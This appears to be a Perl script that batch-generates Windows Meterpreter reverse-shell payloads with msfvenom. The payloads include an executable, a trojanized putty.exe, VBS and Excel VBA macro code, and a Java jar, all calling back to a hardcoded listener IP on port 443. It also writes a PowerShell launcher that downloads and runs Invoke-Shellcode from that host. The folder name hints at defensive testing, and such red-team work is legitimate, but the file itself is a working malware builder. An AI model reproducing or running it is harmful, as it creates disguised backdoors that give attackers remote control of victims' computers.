#!/usr/bin/perl
use strict;
use warnings;

  my($fileNdx, $LHOST, $LPORT, $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder);

  $targetFolder="/opt/local/malwaredefense";
  `mkdir -p $targetFolder`;
#  $LHOST='172.24.10.134';
#  $LHOST='54.83.198.76';
  $LHOST='192.168.1.6';  
  $LPORT='443'; 
  $IoE="I";#Denote file as intended for internal or external use
  $fileNdx=0;
  $payload = '-p windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $commandControl = "lhost=$LHOST lport=$LPORT";
  $encoder = "-e generic/none";
#  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  print "If you want a clean slate, manually delete all files in $targetFolder\n\n";
  
  print "\n\n*** Most Basic Meterpreter\n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > ${currentFileName}.exe`;


  print "\n\n*** Meterpreter packed into putty \n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > ${currentFileName}-putty.exe`;

  print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript) \n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > ${currentFileName}.vbs`;


  print "Copy the Invoke-shellcode.ps1 to the target directory \n";
  print "Checking if PowerSploit is installed... \n";
  if (-d "/opt/PowerSploit") {
    print "PowerSploit is already installed \n";
  }
  else {
    print "Installing PowerSploit now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
  }
  my ($ShellCodePath) ="/opt/PowerSploit/CodeExecution/Invoke-Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/Invoke-Shellcode.ps1`;

  print "Creating the ps1 launch file (run set-ExecutionPolicy unrestricted as admin if needed) \n";
  $currentFileName = &getNextFileName();
  `echo \"IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/Invoke-Shellcode.ps1');\" > $currentFileName.ps1`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $currentFileName.ps1`;

  print "\n\n*** Meterpreter vba  (Paste into Excel Macro) \n";
  $currentFileName = &getNextFileName();
  `msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > ${currentFileName}.vba`;

  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
  $currentFileName = &getNextFileName();
  #`msfvenom ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;



sub getNextFileName(){
  return sprintf('%s/%03d-Stalwart-%sCC-Meterpreter',$targetFolder, ++$fileNdx,${IoE});
}



